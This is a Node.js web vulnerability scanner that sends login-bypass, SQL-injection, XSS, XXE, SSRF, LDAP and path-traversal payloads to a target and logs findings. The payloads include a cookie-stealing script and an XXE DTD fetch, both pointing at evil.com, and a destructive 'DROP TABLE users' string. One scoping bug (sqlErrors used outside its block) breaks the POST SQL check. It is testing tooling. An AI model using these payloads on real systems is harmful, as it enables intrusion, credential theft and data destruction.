#!/usr/bin/env node

/**
 * Web Application Vulnerability Scanner
 * 
 * Specialized scanner for common web application vulnerabilities including:
 * - OWASP Top 10 vulnerabilities
 * - Authentication bypasses
 * - Authorization flaws
 * - Session management issues
 * - Input validation weaknesses
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const { URL } = require('url');

class VulnerabilityScanner {
    constructor(options = {}) {
        this.baseUrl = options.baseUrl || 'http://localhost:3000';
        this.timeout = options.timeout || 5000;
        this.logFile = options.logFile || '/tmp/vulnerability-scan-results.log';
        this.resultsFile = options.resultsFile || '/tmp/vulnerability-scan-report.json';
        
        this.vulnerabilities = [];
        this.scanResults = {
            startTime: new Date(),
            totalChecks: 0,
            vulnerabilitiesFound: 0,
            criticalVulns: 0,
            highVulns: 0,
            mediumVulns: 0,
            lowVulns: 0
        };
        
        // Common authentication bypasses
        this.authBypassPayloads = [
            { username: "admin", password: "admin" },
            { username: "admin", password: "password" },
            { username: "admin", password: "123456" },
            { username: "administrator", password: "administrator" },
            { username: "root", password: "root" },
            { username: "admin", password: "" },
            { username: "", password: "" },
            { username: "' OR 1=1--", password: "anything" },
            { username: "admin'--", password: "anything" },
            { username: "admin'/*", password: "anything" }
        ];
        
        // Directory traversal payloads
        this.directoryTraversalPayloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../../../../../../../../etc/passwd%00.jpg",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.jpg"
        ];
        
        // LDAP injection payloads
        this.ldapInjectionPayloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*()|%26'",
            "*(|(objectClass=*))",
            "*)(objectClass=*)(|(cn=*"
        ];
        
        // XXE (XML External Entity) payloads
        this.xxePayloads = [
            `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`,
            `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>
<foo>&xxe;</foo>`,
            `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo>test</foo>`
        ];
        
        // SSRF (Server-Side Request Forgery) payloads
        this.ssrfPayloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:22",
            "dict://127.0.0.1:11211",
            "http://[::1]",
            "http://2130706433" // 127.0.0.1 in decimal
        ];
        
        // Common endpoints to test
        this.testEndpoints = [
            '/api/admin',
            '/api/users',
            '/api/config',
            '/api/debug',
            '/api/test',
            '/api/internal',
            '/api/private',
            '/api/backup',
            '/admin',
            '/administrator',
            '/management',
            '/config',
            '/settings',
            '/debug',
            '/test',
            '/phpinfo.php',
            '/info.php',
            '/server-info',
            '/server-status',
            '/.git/config',
            '/.env',
            '/backup.sql',
            '/database.sql',
            '/web.config',
            '/WEB-INF/web.xml'
        ];
    }
    
    log(message, level = 'INFO') {
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] [${level}] ${message}\n`;
        
        console.log(logEntry.trim());
        
        try {
            fs.appendFileSync(this.logFile, logEntry);
        } catch (error) {
            console.error('Failed to write to log file:', error.message);
        }
    }
    
    addVulnerability(type, endpoint, details, severity = 'medium', evidence = '') {
        this.vulnerabilities.push({
            type,
            endpoint,
            details,
            severity,
            evidence: evidence.substring(0, 500), // Limit evidence length
            timestamp: new Date().toISOString()
        });
        
        this.scanResults.vulnerabilitiesFound++;
        this.scanResults[`${severity}Vulns`]++;
        
        this.log(`VULNERABILITY FOUND: ${type} at ${endpoint} (${severity})`, 'WARN');
    }
    
    async makeRequest(endpoint, options = {}) {
        return new Promise((resolve) => {
            this.scanResults.totalChecks++;
            
            const url = new URL(endpoint, this.baseUrl);
            const protocol = url.protocol === 'https:' ? https : http;
            
            const requestOptions = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: options.method || 'GET',
                headers: {
                    'User-Agent': 'VulnerabilityScanner/1.0',
                    'Accept': '*/*',
                    ...options.headers
                },
                timeout: this.timeout
            };
            
            const req = protocol.request(requestOptions, (res) => {
                let data = '';
                
                res.on('data', (chunk) => {
                    data += chunk;
                });
                
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        body: data,
                        url: url.toString()
                    });
                });
            });
            
            req.on('error', (error) => {
                resolve({
                    error: error.message,
                    url: url.toString()
                });
            });
            
            req.on('timeout', () => {
                req.destroy();
                resolve({
                    error: 'Request timeout',
                    url: url.toString()
                });
            });
            
            if (options.body) {
                req.write(options.body);
            }
            
            req.end();
        });
    }
    
    async scanAuthentication() {
        this.log('üîê Starting Authentication Security Scan...', 'INFO');
        
        // Test for authentication bypass
        for (const creds of this.authBypassPayloads) {
            const result = await this.makeRequest('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(creds)
            });
            
            if (result.statusCode === 200 && result.body) {
                const body = result.body.toLowerCase();
                if (body.includes('token') || body.includes('success') || body.includes('welcome')) {
                    this.addVulnerability(
                        'authentication_bypass',
                        '/api/auth/login',
                        `Authentication bypass with credentials: ${JSON.stringify(creds)}`,
                        'critical',
                        result.body
                    );
                }
            }
        }
        
        // Test for weak session management
        const sessionResult = await this.makeRequest('/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'test', password: 'test' })
        });
        
        if (sessionResult.headers && sessionResult.headers['set-cookie']) {
            const cookies = sessionResult.headers['set-cookie'];
            cookies.forEach(cookie => {
                if (!cookie.includes('HttpOnly')) {
                    this.addVulnerability(
                        'insecure_cookie',
                        '/api/auth/login',
                        'Session cookie missing HttpOnly flag',
                        'medium',
                        cookie
                    );
                }
                if (!cookie.includes('Secure')) {
                    this.addVulnerability(
                        'insecure_cookie',
                        '/api/auth/login',
                        'Session cookie missing Secure flag',
                        'medium',
                        cookie
                    );
                }
                if (!cookie.includes('SameSite')) {
                    this.addVulnerability(
                        'insecure_cookie',
                        '/api/auth/login',
                        'Session cookie missing SameSite attribute',
                        'low',
                        cookie
                    );
                }
            });
        }
    }
    
    async scanDirectoryTraversal() {
        this.log('üìÅ Starting Directory Traversal Scan...', 'INFO');
        
        const testParams = ['file', 'path', 'page', 'include', 'doc', 'root', 'action'];
        
        for (const payload of this.directoryTraversalPayloads) {
            for (const param of testParams) {
                const result = await this.makeRequest(`/api/files?${param}=${encodeURIComponent(payload)}`);
                
                if (result.body) {
                    const body = result.body.toLowerCase();
                    if (body.includes('root:') || body.includes('daemon:') || 
                        body.includes('[boot loader]') || body.includes('127.0.0.1')) {
                        this.addVulnerability(
                            'directory_traversal',
                            `/api/files?${param}=${payload}`,
                            'Directory traversal vulnerability - sensitive file access',
                            'high',
                            result.body.substring(0, 200)
                        );
                    }
                }
            }
        }
    }
    
    async scanSQLInjection() {
        this.log('üíâ Starting SQL Injection Scan...', 'INFO');
        
        const sqlPayloads = [
            "' OR '1'='1",
            "'; WAITFOR DELAY '00:00:05'--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "'; DROP TABLE users;--",
            "' OR 1=1#",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ];
        
        const testParams = ['id', 'user', 'search', 'query', 'name', 'email'];
        
        for (const payload of sqlPayloads) {
            for (const param of testParams) {
                const result = await this.makeRequest(`/api/users?${param}=${encodeURIComponent(payload)}`);
                
                if (result.body) {
                    const body = result.body.toLowerCase();
                    const sqlErrors = [
                        'sql syntax',
                        'mysql_fetch',
                        'ora-',
                        'microsoft ole db',
                        'odbc driver',
                        'sqlite_',
                        'postgresql',
                        'warning: mysql',
                        'valid mysql result',
                        'mysql_num_rows',
                        'ora-00933',
                        'ora-06512'
                    ];
                    
                    if (sqlErrors.some(error => body.includes(error))) {
                        this.addVulnerability(
                            'sql_injection',
                            `/api/users?${param}=${payload}`,
                            'SQL injection vulnerability detected - database error exposed',
                            'high',
                            result.body.substring(0, 300)
                        );
                    }
                }
                
                // Test POST requests
                const postResult = await this.makeRequest('/api/users', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ [param]: payload })
                });
                
                if (postResult.body && sqlErrors.some(error => postResult.body.toLowerCase().includes(error))) {
                    this.addVulnerability(
                        'sql_injection',
                        '/api/users (POST)',
                        `SQL injection in POST parameter: ${param}`,
                        'high',
                        postResult.body.substring(0, 300)
                    );
                }
            }
        }
    }
    
    async scanXSS() {
        this.log('üîó Starting XSS Vulnerability Scan...', 'INFO');
        
        const xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert('XSS');//",
            "\");alert('XSS');//",
            "<script>document.location='http://evil.com/'+document.cookie</script>"
        ];
        
        const reflectionEndpoints = [
            '/api/search',
            '/api/echo',
            '/api/debug',
            '/error',
            '/search',
            '/'
        ];
        
        for (const endpoint of reflectionEndpoints) {
            for (const payload of xssPayloads) {
                const result = await this.makeRequest(`${endpoint}?q=${encodeURIComponent(payload)}`);
                
                if (result.body && result.body.includes(payload)) {
                    this.addVulnerability(
                        'reflected_xss',
                        `${endpoint}?q=${payload}`,
                        'Reflected XSS vulnerability - user input not properly sanitized',
                        'medium',
                        result.body.substring(0, 200)
                    );
                }
                
                // Test in POST body
                const postResult = await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: payload })
                });
                
                if (postResult.body && postResult.body.includes(payload)) {
                    this.addVulnerability(
                        'reflected_xss',
                        `${endpoint} (POST)`,
                        'Reflected XSS in POST data',
                        'medium',
                        postResult.body.substring(0, 200)
                    );
                }
            }
        }
    }
    
    async scanSSRF() {
        this.log('üåê Starting SSRF Vulnerability Scan...', 'INFO');
        
        const ssrfParams = ['url', 'link', 'callback', 'webhook', 'fetch', 'proxy', 'redirect'];
        
        for (const payload of this.ssrfPayloads) {
            for (const param of ssrfParams) {
                const result = await this.makeRequest(`/api/fetch?${param}=${encodeURIComponent(payload)}`);
                
                if (result.body) {
                    const body = result.body.toLowerCase();
                    // Check for internal service responses
                    if (body.includes('ami-id') || body.includes('instance-id') || 
                        body.includes('security-credentials') || body.includes('metadata') ||
                        body.includes('root:') || body.includes('daemon:')) {
                        this.addVulnerability(
                            'ssrf',
                            `/api/fetch?${param}=${payload}`,
                            'SSRF vulnerability - internal resources accessible',
                            'high',
                            result.body.substring(0, 300)
                        );
                    }
                }
            }
        }
    }
    
    async scanXXE() {
        this.log('üìÑ Starting XXE Vulnerability Scan...', 'INFO');
        
        const xmlEndpoints = ['/api/upload', '/api/xml', '/api/parse', '/api/process'];
        
        for (const endpoint of xmlEndpoints) {
            for (const payload of this.xxePayloads) {
                const result = await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/xml' },
                    body: payload
                });
                
                if (result.body) {
                    const body = result.body.toLowerCase();
                    if (body.includes('root:') || body.includes('daemon:') || 
                        body.includes('[boot loader]')) {
                        this.addVulnerability(
                            'xxe',
                            endpoint,
                            'XXE vulnerability - external entity processing enabled',
                            'high',
                            result.body.substring(0, 300)
                        );
                    }
                }
            }
        }
    }
    
    async scanLDAPInjection() {
        this.log('üîç Starting LDAP Injection Scan...', 'INFO');
        
        const ldapParams = ['username', 'user', 'uid', 'cn', 'mail'];
        
        for (const payload of this.ldapInjectionPayloads) {
            for (const param of ldapParams) {
                const result = await this.makeRequest(`/api/ldap/search?${param}=${encodeURIComponent(payload)}`);
                
                if (result.body) {
                    const body = result.body.toLowerCase();
                    const ldapErrors = [
                        'ldap_search',
                        'invalid dn syntax',
                        'ldap_bind',
                        'ldap error',
                        'ldap:///',
                        'ldaps:///'
                    ];
                    
                    if (ldapErrors.some(error => body.includes(error))) {
                        this.addVulnerability(
                            'ldap_injection',
                            `/api/ldap/search?${param}=${payload}`,
                            'LDAP injection vulnerability detected',
                            'medium',
                            result.body.substring(0, 200)
                        );
                    }
                }
            }
        }
    }
    
    async scanInformationDisclosure() {
        this.log('‚ÑπÔ∏è Starting Information Disclosure Scan...', 'INFO');
        
        for (const endpoint of this.testEndpoints) {
            const result = await this.makeRequest(endpoint);
            
            if (result.statusCode === 200 && result.body) {
                const body = result.body.toLowerCase();
                
                // Check for sensitive information
                const sensitivePatterns = [
                    { pattern: /password\s*[:=]\s*[\w\-\$@!%*?&]+/i, type: 'password_disclosure' },
                    { pattern: /secret\s*[:=]\s*[\w\-\$@!%*?&]+/i, type: 'secret_disclosure' },
                    { pattern: /api[_\s]*key\s*[:=]\s*[\w\-\$@!%*?&]+/i, type: 'api_key_disclosure' },
                    { pattern: /token\s*[:=]\s*[\w\-\$@!%*?&\.]+/i, type: 'token_disclosure' },
                    { pattern: /database[_\s]*url\s*[:=]/i, type: 'database_config_disclosure' },
                    { pattern: /connection[_\s]*string\s*[:=]/i, type: 'connection_string_disclosure' },
                    { pattern: /mongodb:\/\//i, type: 'database_url_disclosure' },
                    { pattern: /mysql:\/\//i, type: 'database_url_disclosure' },
                    { pattern: /postgres:\/\//i, type: 'database_url_disclosure' },
                    { pattern: /redis:\/\//i, type: 'redis_url_disclosure' }
                ];
                
                sensitivePatterns.forEach(({ pattern, type }) => {
                    if (pattern.test(result.body)) {
                        this.addVulnerability(
                            type,
                            endpoint,
                            'Sensitive information exposed in response',
                            'high',
                            result.body.substring(0, 300)
                        );
                    }
                });
                
                // Check for stack traces
                if (body.includes('traceback') || body.includes('stack trace') || 
                    body.includes('at ') && body.includes('.js:')) {
                    this.addVulnerability(
                        'stack_trace_disclosure',
                        endpoint,
                        'Stack trace exposed in error response',
                        'medium',
                        result.body.substring(0, 200)
                    );
                }
            }
        }
    }
    
    async scanSecurityHeaders() {
        this.log('üõ°Ô∏è Starting Security Headers Scan...', 'INFO');
        
        const result = await this.makeRequest('/');
        
        if (result.headers) {
            const requiredHeaders = [
                { name: 'x-frame-options', severity: 'medium' },
                { name: 'x-content-type-options', severity: 'low' },
                { name: 'x-xss-protection', severity: 'low' },
                { name: 'strict-transport-security', severity: 'medium' },
                { name: 'content-security-policy', severity: 'medium' },
                { name: 'referrer-policy', severity: 'low' },
                { name: 'permissions-policy', severity: 'low' }
            ];
            
            requiredHeaders.forEach(({ name, severity }) => {
                if (!result.headers[name] && !result.headers[name.toLowerCase()]) {
                    this.addVulnerability(
                        'missing_security_header',
                        '/',
                        `Missing security header: ${name}`,
                        severity
                    );
                }
            });
            
            // Check for information disclosure in headers
            Object.keys(result.headers).forEach(header => {
                const value = result.headers[header].toLowerCase();
                if (header.toLowerCase() === 'server' && 
                    (value.includes('apache/') || value.includes('nginx/') || value.includes('express'))) {
                    this.addVulnerability(
                        'server_version_disclosure',
                        '/',
                        `Server version disclosed in headers: ${result.headers[header]}`,
                        'low',
                        result.headers[header]
                    );
                }
            });
        }
    }
    
    async runAllScans() {
        this.log('üöÄ Starting Comprehensive Vulnerability Scan', 'INFO');
        this.log(`Target: ${this.baseUrl}`, 'INFO');
        
        try {
            await this.scanAuthentication();
            await this.scanDirectoryTraversal();
            await this.scanSQLInjection();
            await this.scanXSS();
            await this.scanSSRF();
            await this.scanXXE();
            await this.scanLDAPInjection();
            await this.scanInformationDisclosure();
            await this.scanSecurityHeaders();
            
            this.generateReport();
            
        } catch (error) {
            this.log(`Fatal error during vulnerability scan: ${error.message}`, 'CRITICAL');
        }
    }
    
    generateReport() {
        this.scanResults.endTime = new Date();
        const duration = this.scanResults.endTime - this.scanResults.startTime;
        
        const report = {
            scanSummary: {
                target: this.baseUrl,
                startTime: this.scanResults.startTime.toISOString(),
                endTime: this.scanResults.endTime.toISOString(),
                duration: `${Math.round(duration / 1000)}s`,
                totalChecks: this.scanResults.totalChecks,
                vulnerabilitiesFound: this.scanResults.vulnerabilitiesFound
            },
            severityBreakdown: {
                critical: this.scanResults.criticalVulns,
                high: this.scanResults.highVulns,
                medium: this.scanResults.mediumVulns,
                low: this.scanResults.lowVulns
            },
            vulnerabilities: this.vulnerabilities
        };
        
        // Save report
        try {
            fs.writeFileSync(this.resultsFile, JSON.stringify(report, null, 2));
            this.log(`Detailed report saved to: ${this.resultsFile}`, 'INFO');
        } catch (error) {
            this.log(`Failed to save report: ${error.message}`, 'ERROR');
        }
        
        // Log summary
        this.log('', 'INFO');
        this.log('üîç VULNERABILITY SCAN RESULTS', 'INFO');
        this.log('============================', 'INFO');
        this.log(`Total Checks: ${report.scanSummary.totalChecks}`, 'INFO');
        this.log(`Duration: ${report.scanSummary.duration}`, 'INFO');
        this.log(`Vulnerabilities Found: ${report.scanSummary.vulnerabilitiesFound}`, 'INFO');
        this.log('', 'INFO');
        this.log('Severity Breakdown:', 'INFO');
        this.log(`  Critical: ${report.severityBreakdown.critical}`, 'INFO');
        this.log(`  High: ${report.severityBreakdown.high}`, 'INFO');
        this.log(`  Medium: ${report.severityBreakdown.medium}`, 'INFO');
        this.log(`  Low: ${report.severityBreakdown.low}`, 'INFO');
        
        if (this.vulnerabilities.length > 0) {
            this.log('', 'INFO');
            this.log('‚ö†Ô∏è  VULNERABILITIES DETAILS:', 'WARN');
            this.vulnerabilities.forEach((vuln, index) => {
                this.log(`${index + 1}. ${vuln.type} - ${vuln.endpoint} (${vuln.severity})`, 'WARN');
                this.log(`   ${vuln.details}`, 'WARN');
            });
        } else {
            this.log('‚úÖ No vulnerabilities detected!', 'INFO');
        }
    }
}

// CLI Interface
if (require.main === module) {
    const args = process.argv.slice(2);
    const options = {};
    
    for (let i = 0; i < args.length; i += 2) {
        const key = args[i].replace(/^--/, '');
        const value = args[i + 1];
        options[key] = value;
    }
    
    if (!options.baseUrl) {
        options.baseUrl = process.env.TARGET_URL || 'http://localhost:3000';
    }
    
    const scanner = new VulnerabilityScanner(options);
    scanner.runAllScans().catch(error => {
        console.error('Fatal error:', error);
        process.exit(1);
    });
}

module.exports = VulnerabilityScanner;